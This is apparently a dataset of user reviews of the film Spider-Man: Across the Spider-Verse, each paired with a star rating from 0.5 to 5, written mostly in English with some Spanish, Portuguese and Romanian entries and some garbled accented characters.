"la pelicula es una mierda, es lo pero que he visto, es muy predecible lo que va a pasar, la animacion es una porqueria",0.5
"ladies and gentelmans, thats how a masterpiece looks like",5
Must see movie. Everything is perfect.,5
"dang dude what can i say, when i say its a ""good movie"" it really is a good one.",4.5
Smart and fun movie with so many surprises with the multiverse Spidermen.,4.5
Wow just wow I enjoyed 2 hours of my life watching this movie probably the best,5
My favourite piece of animated fiction.,5
Will have an effect on you after watching the film. Crazy plot twist here and there the visual could do better tho.,4.5
"Perfect, just absolutely amazing‚Ä¶ i'm speechless",5
"This movie truly captured the essence of a comic book, with its stunning visuals and engaging storyline. The pace of the film was just right, allowing for proper character development without feeling rushed or dragged out. One of the things that impressed me the most was how the movie found a balance in its storytelling. Comic book movies often have a lot to convey, and Miles' next story definitely had a lot to tell. However, the film managed to find a good pace that kept me engaged throughout. It didn't rush through important plot points or character arcs, but it also didn't dwell on them for too long, risking losing the audience's interest. What I appreciated the most was the movie's ability to keep the pace slow enough to allow for real development, build-up, hints, and an appreciation for the story to age like fine wine. It was evident that the filmmakers took their time to craft a narrative that was both meaningful and captivating. The character development was spot-on, allowing us to connect with the characters on a deeper level. The visuals in Spider-Man: Across the Spider-Verse were absolutely stunning. The animation style was unique and innovative, bringing the comic book world to life in a way that I had never seen before. The attention to detail was remarkable, and it added an extra layer of depth to the overall experience. The film also had a fantastic soundtrack that perfectly complemented the action on screen. The music choices were on point, enhancing the emotional impact of key moments and adding an extra layer of excitement to the already thrilling scenes. Overall, Spider-Man: Across the Spider-Verse is a must-watch for any comic book fan or lover of animated films. It strikes the perfect balance between storytelling, character development, and visual spectacle. The pace of the film is just right, allowing for a truly immersive and enjoyable experience. I highly recommend this movie and can't wait to see what the future holds for Miles Morales and the Spider-Verse.",4.5
9.4/10- damn near perfect. That chase scene with all the spider men was amazing. Can‚Äôt wait for 3,4.5
Just an incredible movie from it's plot to it's animation. An amazing experience that will still have an effect on you even after you finish the movie. Most definitely a must watch.,5
"I want to give this a 10 so bad. But there were quite a few times when the audio/sound mixing was terrible and I couldn't understand what the characters were saying. I can't wait to watch this again and see if it was a movie theatre mistake or that's how it was. I hope it was a movie theatre mistake. Spider-Man: Across the Spider-Verse is a visual treat. Every frame is a painting (I miss that youtube channel) and in some cases is. Everything just looks so good and the artists & directors took even more care to make it look like a comic book. It just looks so good! There is a reason why over the past few years, other studios have been following suit in this animation style. In Spider-Man: Across the Spider-Verse the directors have only set the bar higher for visual storytelling. Spider-Man: Across the Spider-Verse isn't just a blockbuster, it is emotional, sad, action-packed, and a decent comedy. For a film that is so big, with so many characters, it can slow down and focus on these many characters and let them shine in their own ways. I can't wait for the next film and dive back into the spider-verse. ""Who are you?""",4.5
I always get back up-miles morales,4
"Loved it, loved how Spider-Man 2099 was done.",5
"For a sequel it was fantastic. As a standalone movie it's also great. The first movie introduced us to the idea of a multiverse and this second movie really expanded upon it. Can't wait to see what they do next, but I will.",5
"Honestly, my favorite movie, it had good action. A good twist at The end, a good amount of comedy and the comedy that was in it was amazingly funny. I keep watching it and watching it because it's just so amazing.",5
"A great addition to the spiderverse that is growing both the character, and the story. Incredible art styles and universe expansion.",4.5
"It was action packed, keeps you interested throughout the whole movie",4.5
"The visuals, the voicing, the storyline - everything about this movie was fantastic. It was such an incredible movie to see in the theaters.",5
SPOLIERS AHEAD! 4.5/5 Across the SpiderVerse is a great sequel. but Into the SpiderVerse is beter mainly for most of the movie there just talking about CANNON EVENTS. still great,4.5
"The animation is stunning. Tons of character s are introduced but it never once feels overwhelming. The plot is heartfelt, emotional, and moves at the right pace for the majority of the runtime. Only gripe with this one is that it got split into two parts. At least 30 minutes could have easily been chopped off to give space for a proper ending.",4.5
"Spider-Man: Across The Spider-Verse - 10/10. Its tough to surpass a well beloved original. Let alone surpass its quality and entertainment factor. But, here, Across The Spider-Verse does the trick. What a followup! Visually, the most adventurous and invigorating animated film in years! Of course, this is literally a two parter, and it leaves you on an annoyingly satisfying cliffhanger. But what an incredible job on the animation. Its so in depth and vivid, full of details and easter eggs. Its loaded with surprises and fun, and never relents in its dedication towards entertaining you. Great great time (and watch it in IMAX)!",5
"Really fun movie, but the ending is a little disappointing",4
Refreshing and a well-thought script. Can't wait for the sequel!,4.5
The very definition of a masterpiece. Sequels don't get better than this.,5

a good site for viewing movies,5
Great story Amazing animation,5
"Spider-man Across the Spider verse is a movie that had the past movie in 2018 called ""Spider-man in the Spider-verse"" and the both movies were amazing and the plot of both stories are incredable and the connect to each other in a way that you dont't even repair, I recommend this movie to any person, by being a animation it dosen't means that adults wouldn't enjoy it, by that, you can think that is a more ''serious movie"" but it has your funny moments and your serious moments and with all that factors, I think you should watch it.",5
Loved the movie only got to see half due to incident at theater causing an evacuation,5
There is a reason we don't do sequels to movies in no need of one. The first one was brilliant and felt very authentic. Unfortunately this one was lacking creativity behind it. Was really bored the whole time.,1
Spider Man is one of the greatest animation movie of all time. This new animation has the same impact with the great story and beautifull animation. Worth to be visionated.,5
"Super aplica»õie,‚ù§Ô∏è‚ù§Ô∏è",5
Interesting characters . Loved the way they portrayed his relationship with his parents.,3.5

"This isn't a Rare Win From Sony/Marvel, They always Dropping Bangers! 9/10 NO DOUBT!!!!!",5
Was a great sequel and continues the good storylines from the original. I hate the two part finales/cliffhangers though so slight deduction for that. I wish they would tie up each movie and have the third finish the storyline without feeling like you just saw half a movie (after 2+ hours).,4
Too much overlapping animation. Sensory overload.,1
"This was a very good film. It was different from the first one. However, the storyline and characters helped flesh out the story set forth in the first installment. So excited to see the continuation!",5
A bit overrated but a good movie,4

The best Spiderman movie hands down and the best movie I've seen this year!!,5

"Nothing short of a masterpiece in every level. This is an example of an artist who knows the rules but breaks them all in the pursuit of bold strokes and techniques that make a lasting impact. With incredible animation, a diverse score hitting various moods and character personalities, and a bold story with all the twists and turns ‚Äî it is a movie of the ages that gets better on every watch.",5
"Kinda crazy, but okay!!!",3
"A real let down compared to the first one. The audio was bad, especially in the beginning, difficult to hear what was going on (this was in the digital version, but friends told me it was the same in the theatre). The writing was sloppy, the animations were jarring. Ultimately it was a bit boring.",2.5
"Why do they get the films so wrong and the cartoons so right I cannot understand. Great film, great story, can't wait for more.",5
"9.3/10 With star-studded animation and epic action sequences, Spider-Man: Across the Spider-Verse is a perfect sequel to Into the Spider-Verse!

This movie is not as fun as the last one but it is way more emotional and interesting. I cant decide which i like more but i think i am leaning more towards this one.,5
Even better than the first was not prepared for the ending‚Ä¶. NEED NEXT ONE NOW,5
"It has everything, heart, care, action, story, tense moments, soundtrack that genuinely fits all audiences and works every time, and somehow even MORE feats in animation! Genuinely actors, directors, animators, sound operators, everyone gave it their all, and that's why it's a must see 10/10.",5
Perfect movie. A shame the animators weren't well treated during the creation of this masterpiece.,4.5
Decrease the graphic quality and storyline. Choppy and boring. Had to try 4 times to finish.,0.5
Bigger but not better. The new animation style reminds me of reading a comic book. 2099 is a great addition with so many other nods. Great story that I cannot wait to see finished in the third film,4.5

"A clear example of how to do something new* in the old universe, so as not to accuse everyone right and left of racism and not clean up ratings on imdb, and not buy bots to have a good rating on rotten tomatoes xD That Black Panther (They earned more money), that Miles Morales (2 movies that were very well received) is an example of the fact that if they do something new and of high quality, it will bring either big money, or the love of the public, or both) but yes, it's easier to accuse everyone of intolerance, racism, etc...",5
It's not worth it I watched the movie and it just leaves you off with a huge cliffhanger when you're hoping to see the full movie and it has me searching up when the next part of the movie will come out and I have to wait until next year for the second part to come out when I was hoping it would come out that same day Now I have to spend at least $40-$60 after just spending $20 for me to go see that movie to have to spend more money to see again,1.5

Miles Morales este atras de Gwen intr-o aventura multidimensionala pentru salvarea universurilor multiple si are probleme cu inamici diversi, care-l determina sa imbrace costumul de supererou Spiderman. Stilul de animatie stilizata, firul narativ, actiunea si scenariul sunt bine construite, iar vocile actorilor sunt extrem de atractive. In mod cert va fi o surpriza placuta si-l recomand cu incredere.",5

"Sucedendo a t√£o aclamada anima√ß√£o de 2018, ""Homem-Aranha atrav√©s do aranhaverso"" n√£o supera o seu antecessor, por√©m, mant√©m o n√≠vel de qualidade l√° no alto, seja em aspectos t√©cnicos como dire√ß√£o, edi√ß√£o e fotografia, ou no pr√≥prio roteiro que desenvolve e expande com excel√™ncia esse novo aranhaverso. O elenco de dublagem continua impec√°vel em suas interpreta√ß√µes, em destaque a do personagem Miguel, que rouba as cenas por conta de sua impon√™ncia, e tamb√©m a do pr√≥prio Miles que aqui evoluiu absurdamente como personagem, se tornando um verdadeiro her√≥i que segue seus ideais. A trama √© boa, muito boa, mas peca no final pela sua falta de conclus√£o, pois um filme deve se sustentar sozinho, independente de estar dentro de uma trilogia ou n√£o.",4.5

THE MOST Creative Animated Movie Ever. Amazing !! Must watch.,5
"Somehow, they were able to outdo the last one. Moore and Steinfeld return and really make everyone forget how it took 4 years for a sequel. The art of this movie may push it as the GOAT of animated movies (definitely oscar-worthy). New additions like Oscar Isaac, Jason Schwartzmann, and Daniel Kuluuya really bring another level of awesome to a movie that seems to supersede the concept of the cliche superhero movie.",5
Excellent watch. Brilliant score and crazy good animation. It truly takes everything that made the first one so special and launches it to an even higher standard. Oscar Isaac's performance as Spider-Man 2099 is brilliant and noteworthy.,5
"Total fan of this franchise. Most sequels suck, but this one a definite plus over the original. I'm not going to get all existential like some of the other snobs on this forum. I'm just going to speak from the heart. The think I love most about this version was the addition of other funny characters. ""Pavitr Prabhakar"" was hilarious!!! Dude has to be in the next one for shiz. ""Spider-Punk"" (AKA Hobart ""Hobie"" Brown), was also a funny character and I love his rebel behavior. I wonder if he will evolve into a foe at some point. His character was a nice twist to the story at just the right moments. Last, but not least, was ""Miguel O'Hara"" (played by man Oscar Issac). To be honest, I did not know it was him until I looked it up. The villainy of this character is constantly building up. You won't be sure when he either pivots and comes to his senses or goes off the deep end towards full bad guy. On another note, they used the (now) classic multi-dimensional twist to bring back Miles' uncle Aaron in a manner that makes you wonder if he is going to help or hurt our hero.",5
"Another fantastic film. Everything is A-tier - storytelling, visuals, music/sound design, voice acting. Cannot recommend watching these movies enough. Do not let it being an animated movie sway you, the theme and tone is balanced and treats it's audience like adults. Disney's Marvel should take notes.",4.5
"This movie has a great animation style, characters, and soundtrack. I took my daughter (7) to see the movie with me and we both enjoyed it. This movie does have more of the serious tone compared to first movie and did seem to have my daughter a little less interested then the first one. There is also the feeling that this movie does feel incomplete. There is not a clear resolution for Miles and it makes the movie feel like it is incomplete. Other than that this is a great movie and I highly recommend this for any Spidy fan young or old!",4

everything a Spider-Verse movie should be little easter eggs that bring depth when u see Andrews spiderman and a lady from Venom it brings it all together. We want more of it,5
"Sony Pictures's newest animated superhero film is the sequel to Spider-Man: Into the Spider-Verse (2018). In the movie, Miles goes on an adventure with Gwen Stacy across the multiverse where he encounters a team of Spider-People known as the Spider-Society, led by Miguel O'Hara/Spider-Man 2099, but comes into conflict with them over handling the new supervillain Spot. With masterful mind-blowing animation with the essence of comic books and an electrifying plot that just never stops being fantastic -especially with the action scenes-, this second installment proves that this Spider-man franchise will be the best that ever was, as it even encompasses the previous live-action movies with small Easter eggs and references, as well as every Spider-man comic book, TV-show and video game that have been released. The cliffhanger is incredibly shocking and even though it is a reminder that the best is yet to come, it feels a bit incomplete on that front. The voice acting is excellent, the characters are well-developed, the soundtrack is sublime and it is just a mesmerizing colorful spectacle from beginning to end. Many awards for this movie!!",5
It's a great movie and I love miles morales as Spider-Man he's easily my favorite Spider-Man the animation the score and all the side characters are amazing and Spider-Man 2099 and the Spot are amazing villains however where I have problems with this and they are problems not just these minor issues that bring it down just a little bit 1.I do think it takes way to long to get going now when it did get going it was amazing but the first 10 minutes are a bit of a drag 2.While it's cool and ambitious to have a hard cliffhanger I would have rather had a resolution then a cliffhanger kind of like empire strikes back and the dark knight I would say I'm mixed on the cliffhanger 3.It is slightly ovverated which makes me not want to give it a 5 star I still think it's an amazing film but when it's extremely hyped flaws stand out a little more I still think it's a top 10 superhero movie of all time,4.5
"As far as sequels go this is incredible but as far as overall movies go, this is AMAZING. Animation is groundbreaking with a different style for each world and different unique characters to go along with it. Movie takes some stuff from the comics but also makes original ideas to the plot as well. Cliffhanger ending was great as well leading onto the next one with enough information to try and guess what will happen next.",5
"OMG GOD SOOOO GOOD, THE ART TASTES DELICIOUS",5
"Loved the animation style, and the new caracters, especially miguel, but there are somethings taht could be better, for example the music, that isn't used as it should, for example one of the main musics, the one about being in the spider-verse, isn't used (the lirics part), and it should, search it on youtube and you will see why. the other is the thing, ""I'm special and if I do it there won't be consequences"" thing on the protagonist. I just hope that they aren't afraid to show us the truth about choises, in the next movie, instead of trying to be a show for kids. Great part2",4.5
Amazing animation. Lots of heart too,4
"Loved into the spiderverse but the next one is even better, the visuals were breathtaking, overall this movie was amazing and I could watch it over and over and over, definitely a must see!",5
"Um filme t√£o bom quanto o primeiro, com uma hist√≥ria maior e que realmente me agradou, tendo um universo mais explorado e com personagens marcantes, s√≥ fiquei triste pelo final que infelizmente n√£o tem üòî, mas entendo a equipe de anima√ß√£o q n√£o teria tempo pra fazer o restante do filme, pra mim j√° esta bom, s√≥ me decepcionou um pouquinho",4
"One of the most electrifying ( no pun intended ) and brilliant superhero movie of all time. Speaking from an animation point this movie does the most and pulls it off solidifying itself as a masterpiece. The voice acting, characterization, action, score, attention to detail, animation, and plot all bring it together to be one of the greatest in theater experiences I've ever had. My only complaint would be the pacing was a little fast once we got to a certain point, but maybe they're just ahead of their time.",5
"""A COLOSSAL CREATION OF SPIDER-WORLD IN THE MOST SUPERLATIVE WAY."" Miles Morales's story to the next part which traverses through the multiverse. The huge faults create a gigantic messed up cracks and fissures in the symmetrical flow of the timeline. The absolutely astonishing visual style of animation owns this film and teleports it to the place where no other film has reached. This film is bonkers in catering countless creative choices in its every fascinating frame, each looks like a spectacle at best. The graphics and artwork creatively screams and mellows us with its perfect comic style representation. The mega chase sequence with the spider society is an amusing ride. The action sequences are rushing pulses which standout and validify the reason why we shall blow our minds in front of the big screen. The creation team and art team of this film outperforms the first installment and establishes a benchmark for the future of animation. The humour and emotions find a way in this splendid world. The storytelling and narration is well webbed in the long pacing. Miles Morales's appealing storyline is intertwined with multiple other plots across the spider-verse. Gwen's character is a shining lamplight. All the other spideys from different worlds make a place to form the intriguing exploration of the multiverse. The spot is really an unique character choice to add on in the multiverse trajectory. Miles Morales's bond with his parents is an inspiration upon which the story finds a heart and soul. In here also, there is this fate of spiderman, that he or she has to make a sacrifice to withhold the power that flows in him. As every time, the stirring and insightful words from the mentors of spiderman thrives that matters in every storyline to serve the purpose that every superhero needs. The film often softens from its epic tone like a subtle colour to penetrate the bulky ambition and poignant emotions it carries. Probably the finest Spidey film to date. It ends with a cliffhanger, promising a beyond trek. Indeed, this film is a fabulous work of art that reminds us that there is no frontier to creation. It has just pulled us into its world of millions of our own-selves...",4.5

Best 140 minutes of any Spider-Man movie.,5
"This is without a thought one of the best animated movies I've ever seen, I loved every Spiderman version in this spiderman, And if you like Spiderman or animated movies you must see this movie.",5
"This is a five star movie absolutely ruined by its cliff hanger ending. It's 2.5 hours long! If you can't tell a coherent story that ends in that time, you're in the wrong business. The movie itself is beautiful, and enthralling. But I definitely would not have bothered if I'd known it was incomplete, or not until the next installment was available at any rate.",1.5
"Absolutely incredible. I enjoyed it more than the first, and that's saying something. Look, from the start, I was so hooked with Spider-Gwen's story that I was kind of like, ""You know what... I could watch a whole movie just around this character."" But then we get back to Miles... who remains one of the best comic characters created in the past couple of decades, and it's only strengthened here. There is a definite arc here for him, and it's thrilling when it reaches the climax of this film. However, let's just talk about the mindblowing amount of stuff that flies by in this movie? I mean, as someone who has read this character for over 40 years, I was just grinning like an idiot through all of this as they hit you with just about everything that's ever happened in the Spider-Verse. I love how the main villain seems inconsequential at first but then becomes the threat that he is. Jason Schwartzman is just awesome as The Spot... can't wait to see what happens with the next one. Heartfelt, thrilling (I almost jumped out of my seat so many times, and I was watching this on the couch üôÇ ), chaotic, and just an extraordinary piece of art. I hope they stick the landing with the third one, because as far as I'm concerned, this is one of the best superhero movies ever made and, quite frankly, definitely one of the best animated movies that was ever made.",5
"Es una pelicula increible, tiene una animacion excelente, personajes altamente carismaticos y memorables, momentos graciosos y emotivos, lleno de acci√≥n y fantasia, pero hay personajes que estan del todo bien aprovechados como Penny Parker, ue en la primera pelicula era una personaje medianamente importante, pero en general es una muy buena pelicula.",5
Absolutely gorgeous. Solid plot with just the right proportion of drama to comedy.,5
"Just great. Almost perfect Spider-Man movie, loved it! However the ending... It just hurts waiting for part 2.",4.5
"The movie was great and beautiful, but taking the #1 spot on letterboxd is a little crazy. It's a fun movie, and the animation and creativity behind it is outstanding, but it's definitely not the best movies ever made. There were many times where it just felt slow and uninteresting. And the opening scene with the drums just felt obnoxious. There were fun cameos and a lot of hidden stuff but many movies have done the same thing.",4
Still stunning with hearts. The ending (or a lack thereof) was unexpected. The pacing and structuring need more refinement.,4
"Absolutely the Animation! Great plot, highly accurate, detailed, actually the best way to have an intence fun...eagerly waiting for Beyond the S-V...!",5
"This is one of the greatest superhero sequels (perhaps one of the greatest sequels period alongside The Empire Strikes Back), I have had the pleasure of watching. It expands on the first movie in all of the right ways whilst staying true to the ethos of the original. There is no underlying motive or agenda. It is truly just good, original cinema in a genre otherwise flooded with mediocre conveyor belt movies. The art continues the trend set in the first movie: using the medium to add to the story in ways that simply aren't possible in live action. However, the use of stylised art is greatly expanded on here because we see other dimensions - entire worlds that feel very much different and unique from each other. My favourite is a watercolour based world propelled by emotion. I won't spoil it, but keep an eye out on the backgrounds of this world as you watch. It is quite spectacular. Character development is pushed forward in all of the right ways. We get a much deeper insight into Gwen's world: her family life, what makes her tick and her motives for actions in the movie itself. I also love the relationship they continue to develop with Miles and his parents. The level of depth they explore here is quite remarkable, especially for an animated film. They do not shy away from 20 minute sections away from fast-paced action in favour of spending the time exploring how Miles taking on the mantle of SpiderMan affects his personal life. The ""villains"" in this movie are also a standout feature. I genuinely understood and cared about both of them. They had logical and compelling reasons for taking the path they had, perhaps more-so than in any other superhero film I've seen to date. So much was this the case that I'm still questioning which side is ""right"" - if anybody is completely correct in their actions at all. The villains also have very defined abilities and power levels, which in this genre is becoming very rare. We understand at all times what the villain can and cannot do and I was even able to correctly guess how Miles and the gang might be able to put a stop to them. Again, this is quite rare. Many movies in the genre today have villains with no defined power level that suddenly pull new powers and tricks out of the bag at the last minute just to throw the viewer off and move the plot forwards. It's lazy script writing and it's refreshing not to see it here. One of my favourite things about all key characters in this movie is that nobody gets it easy. Nobody is unreasonably more intellectual, or more powerful, or always correct, or inherently better in any way. Miles makes mistakes. Gwen hides the truth. Peter abuses Miles' trust. They all fall short and have to learn the hard way. This makes the narrative very compelling and at no moment in this film did I roll my eyes; there is more gritty realism and grounding in this animated film than in countless actual live action superhero movies. There are many other things I could discuss here that contribute to this being one of my favourite movies of all time, but I'll hold off. Go and enjoy it for yourself.",5
"With stunning visuals, intriguing plot and action-packed battle scenes (and just a touch of humour) this had me running up the walls with amazment! But I'm my opinion, I consider two hours to be a bit long for animated movie and I feel like this could've been split into two movies. Other than that tiny nitpick, this is pure cinema at it's uttermost peak. 5 stars. üåüüåüüåüüåü You've deserved it!",5
The plot the story the fights everything about this movie is a masterpiece,5
"Best Spiderman movie of all time, amazing animation and soundtrack. Incredible film.",5
"A sequel that truly rocks the house! It's all about characters taking the spotlight in this one, weaving an emotional story that hits you right in the feels. The artistic style is on another level, giving the whole movie a vibe that's both deep and cool. This flick isn't just raising the bar for computerized animation with 2-D elements, it's practically launching it into the stratosphere! If you're a Spidey nut, a superhero geek, or just someone who digs seriously awesome movies with killer visuals, this is your jam. I'm not even kidding, I'm lost for words on how mind-blowingly awesome this is. Soundtrack? Epic. Characters? Nailed it. Plot? Twisty and perfect. And the visuals? Prepare to have your mind blown! The way they switch up the art style and colors for each character is like nothing you've seen before, making this movie pop like crazy. Don't miss out, seriously!",5
"Great visuals and an awesome movie. Incredible cliff hanger to end on as well. Ultimately I think Into the Spiderverse was a better film, but this is a solid must see sequel.",4
wow super awesome! one of the best animated movies ever made ...,5
"Undoubtedly, this animated gem reigns as my all-time favorite. It boasts unparalleled excellence in every aspect. ""ATSV"" delivers an astonishingly original and refreshingly unique storyline. Oscar Issac's voice work is nothing short of brilliance, impeccably embodying his character. The dialogue, animation, cinematography, music, and soundtracks all garnered my genuine adoration. The wait for 2024 fills me with excitement. This film had me at the edge of my seat, eagerly anticipating what's to come. ITSV & ATSV reign as the ultimate Spidey flicks ‚ù§Ô∏èüëåüëë. Gwen Stacey and Miles Morales üíë in ITSV/ATSV outshine all three live-action Spider-Men in terms of character depth and writing üëå",5
"This movie is awesome. I absolutely love the character development, especially of Miles, seeing him form into a leader, so good. I love how detailed it is, I absolutely absolutely absolutely love the animation style and details. I love how in the different universes the animation style changes it's so good. I love the villains and the balance of humor and Miles finding himself. I said it before and I'll say it again soooo good. The only thing stopping this from being my favorite movie of all time is that- *SPOILER ALERT* I wish it had a resolution. The entire movie was setting up and it kept rising and the end of the movie was a climax. It just feels like the second movie was made for watches and didn't serve a point. However it did fill in some much needed backstory and development and emotional attachment. It dives into characters in a deeper way. Once again soooo good. :)‚ô•Ô∏è",4.5

"Spider-Man: Across the Spider-Verse is a visually impressive film that delivers on its promise of spectacle and manages to entertain with its chaotic narrative. However, it has lost its essence, at least for me, and has dramatically diminished the meaning of the costume. Seeing hundreds of the friendly neighborhood spider all at once, and even worse, all in the same place, erases the character's image as ""the friendly neighborhood spider."" It's entirely absurd in a story where even the Elephant appears as Spider-Man within an intergalactic organization. I was pretty excited when the multiverse idea was first introduced. But it seems that neither What If!, nor Doctor Strange in the Multiverse of Madness or Across the Spider-Verse have been able to provide what I was looking for. Worse yet, they are slowly causing me to lose my enthusiasm for Marvel and its characters. It's disheartening.",3

This is my favourite movie of the year. The animation in this movie is the best ever. This is an emotional roller coaster that focuses on the characters. Each character is interesting and unique. The fun little cameos scattered through out the movie is enjoyable and fun. The performances are dazzling and truly amazing. The cliff hanger at the end left me in shock and made me want more.

"I won't waste my time searching for adjectives to eulogize this movie with because I don't know if I can come up with enough to justify how much I enjoyed it. I will say that I didn't expect it to be this good. Frankly, I was a bit worried because how do you top a movie like ""Spider-Man: Into the Spider-Verse"" with a sequel? Answer: This movie is how you do it. Plot-wise, the film is on a grander scale than the first. The stakes are higher, I think the action is more intense, and the setting is broader ‚Äî still the multiverse, but we go more in-depth into how they're connected in this movie. The film introduces more characters and makes it work so well without ever feeling overstuffed. We're given a glimpse into these characters' lives; just enough to keep us invested without distracting from the movie's main conflict. The pacing of this movie is freaking spectacular, as it just keeps getting better and better. Cliffhangers are never fun for me, but this one did not leave me anxious or confused. I anticipated it because the film built the plot steadily without resorting to cramming a reserved segment with too much information. The climax was saved for the end, and it paid off well. The writing just slaps at every turn, balancing out the film with the right amount of humour, heart and wit. The soundtrack sounds so good in the context of the movie and honestly elevates the experience. The animation is still as fun, vibrant and innovative as ever. I initially thought the art style used to portray Gwen Stacy's universe was a bit distracting, but the use of colour is brilliant and almost makes me forgive the elusiveness. This is just all-around perfection, and it's refreshing to see a superhero flick still deliver this level of quality, much less a sequel. I am only excited for the next one, and ""excited"" is a modest choice of words.",5

"Where do I even start. What a film. Spider-Man: Across the Spider-Verse may be the most dazzling motion picture I've ever had the privilege to watch. Not only does it match its predecessor, it actually surpasses ""Into the Spider-Verse"" in many ways. Its story is intriguing, yet emotionally captivating, introducing something new, yet staying true to the character, giving more depth to Miles. He becomes his own Spider-Man, and not just some Peter Parker wannabe. It also shines more of a light on Gwen Stacey. She's almost a co-lead with Miles. This movie also manages to reinvigorate my interest in the multiverse. The dialogue was sharp and witty, much like the first movie. The film is over two hours, but I never lost interest. The cliffhanger was impactful, leaving me genuinely curious about what will happen in part two. The voice performances are top-notch. Literally everyone brings their A-game. This film is essentially a technical masterpiece. This is hands down the greatest animation I've seen in a feature length film. It combines a plethora of styles and integrates them seamlessly. There were moments where I was literally awestruck, and at a loss for words. How did this only cost $100 million? It's ridiculous. Each significant character has their own unique style. I loved the colour changes during the emotional scenes. There are also references and callbacks that fans will appreciate. The action is also well-done, knowing when to speed up but also slow down. It has good energy. Daniel Pemberton's score is incredible. I listened to it isolated from the film and thought it was great, but in the movie, it's perfect. It has this combination of genres and styles, unique to each Spider-Man. If I had to nit-pick a few flaws, I'd say that this is very much the first of a two part story. While that's not necessarily a bad thing, it did leave the film feeling rather incomplete and unable to stand on its own, even though I knew this going in. Another would be the original Peter Parker. While he's not the main character, sometimes it feels as if the story doesn't have much respect for him. Lastly, I'd say the humour doesn't hit as hard as in the first one. It's certainly not non-existent, but it's not as laugh out loud as its predecessor. In conclusion, ""Spider-Man: Across the Spider-Verse"" is a bright, entertaining, heartfelt movie full of Easter eggs that sets up its upcoming sequel extremely well. I guess Sony never needed Disney/Marvel. I genuinely struggled to come up with this review.",4.5

"In my opinion, the best spiderman movie and the best movie of 2023",5
"It was amazing on many levels. The animation leaned on the less fluid more shadow based style that lends it some noire hyper realism quality. The vocal work was top notch. Even the story was full of issues but covered all its own tracks to escape them. It lost a star because its story/strength was using and abusing the multiverse theory that has taken over Marvel and DC for the past 2 decades. While embracing this and building a universe that polices and encompasses all the multiverses seems neat, especially early on when its info overload and Miles is just trying to catch up, it doesnt last. By the end, when you start to figure out that the high speed animation and all over the map characterizations of unlimited spider-man personas was interesting when it initially exploded onscreen; that grows tiring before long. I dont need to see a dozen shaved versions of a character all display many nuances or differences to pique my interest and see which one becomes the hero of the moment. Id rather one who is interesting and developed use the screen time well and impress me. This isnt a flaw in this movie persay as much as its an ode to if you cant do it well enough in one universe, doing it soso in many isnt really an improvement. It is interesting, and they did as well as could be expected with a tiresome idea rewritten many ways to be the central theme. Still, you wont suffer to watch it once. It does keep just about all the characters 1 dimensional and predictable, but they keep the journey mostly exciting (if not a bit too Miles-favoring at times).",4

Lo que vi, literal me eriz√≥ los bellos corporales que casi no tengo, es una de las pel√≠culas que no me ha hecho despegarme de la pantalla ni por un momento, ni si quiera para acomodar la almohada... Estuve 2h con un ac√∫mulo de emociones que no soy capaz de explicar, pero lo intentar√©. Miles!? Miles de convirti√≥ en m√°s que un personaje, pasar a la 4ta dimensi√≥n! Esta pel√≠cula tiene todo! Gusto, concepto, arte, dise√±o, est√©tica, COLOR! Lo mejor que tiene es la distorsi√≥n crom√°tica, qu√© es esto!? No alcanzo a coordinar bien las ideas porque realmente me tiene ruborizado, a√∫n estoy tratando de compactar las ideas... Voy a concentrarme, as√≠ que puede que me extienda un poco, tratar√© de no hacer Spoilers porque es una peli que todos merecen ver... Ok... Aqu√≠ vamos de nuevo (calma!-conten tus emociones) Into The Spider Verse fue lo mejor del 2018 a pesar de que compiti√≥ con Dragon Ball Super Broly, y fue dif√≠cil para m√≠ arribar a un criterio con franqueza porque me encontraba ante mi super h√©roe favorito, y ante mi serie manga favorita, pero mi juicio no me nubl√≥, y supe tomar una buena decisi√≥n, la cual es evidente. Across The Spider Verse es una magestuosidad, creo que es una de las cosas que no me perdonar√© en la vida por no verla en el cine justo en su momento de salida, pero eso no viene al caso. Parto por la incre√≠ble animaci√≥n, 10000km de distancia entre todo lo que he visto hasta ahora (con raz√≥n tanta demora desde 2018) los distintos Spider-man (incluso ara√±a blanca el de PS4) todos bien ilustrados con su respectiva ilustraci√≥n, cada detalle bien cuidado, cada movimiento, cada escena, cada apartado visual, qu√© se piensan, que el CGI no es buena idea!? Tomen por toda la cara! Ignorantes! Es GOLD! El Soundtrack, ni hablar, para m√≠ Ya es meritoria de varios Oscars, Across The Spider Verse!? Se deber√≠a llamar Alrededor de varias emociones (en todos los sentidos) el uso de los viol√°ceos me record√≥ a mi estilo de dibujo, es algo sencillamente inusual, y amo lo inusual. Miles es un personaje que me encant√≥ desde siempre, jugar Spider-man Miles Morales me fascin√≥, por el incre√≠ble sentido de la justicia que tiene, pero m√°s que eso, por sus convicciones, lo mejor que tiene este personaje, es d√≠ficil ver un enfrentamiento entre t√∫ Spider-man favorito (2099) y el Spider con el que m√°s identificado te sientes (Miles) para m√≠, un espect√°culo de emociones, y como todo lo que hago, lo hago con pasi√≥n, m√°s involucrado me sent√≠, es como si mi mano sintiera envidia de los artistas que trabajaron para hacer esta pel√≠cula, no tengo palabras, ya estoy divagando demasiado... No quiero seguir, porque voy a volver a llorar de la emoci√≥n. S√≥lo veanla y debatimos despu√©s, ok!?",5

"Very good movie, it emphasizes the motives of the characters and gives them a purpose based on their actions and social relationships, Miles is a good character and allows us to see a facet of spiderman in which despite knowing that something ""has to happen"" he does not want to become attached to that and on the contrary, he wants to form his own destiny.",5
"Any animation fan will lose their shit over the visuals. And any Spider-Man fan will lose their shit at the amount of comic references and characters they can spot in scenes of Nueva York. And any movie goer, no matter what their interests are, will lose their shit over the great story telling and all around astonishing film they just bore witness to. I will meat ride for years about how absolutely fantastic this sequel turned out to be!",5

"This movie is just a masterpiece. Nothing else has to be said, it's just a masterpiece. 13/10",5
Lastima que no tenga final,4
The greatest story of Spider-man continuous perfectly,5
This movie is a masterpiece!,5
They have outdone the previous one.,5
"I was finally able to watch this film digitally as it didn't come out in theaters in my area, all I have to say is that it exceeded my expectations. Since into the spider-verse, I knew this one would be as great as it's predecessor if not even better, the story the characters the music and soundtracks, all are nothing short but amazing Best thing about it is the art, the animation and the direction and editing, it really was joyful and fun without a single boring moment, the animation was so smooth and you could pause the film at any moment and you'd still get a piece of art due to how much detail was in every scene. Gwen is one of the best female superhero characters, this is how you make female characters relatable and strong without pushing anything woke I like both films the same but I think the first one has fuller story due to this ending on a cliff hanger continuation. The only negative to this film is that it ends too soon.",5
"The animation in this movie is astonishing alongside the acting and writing which makes it one of, if not the best-animated films of all times",5
This movie is a must see it is the best,5
Amazing! One of the best animated film of all time.,5
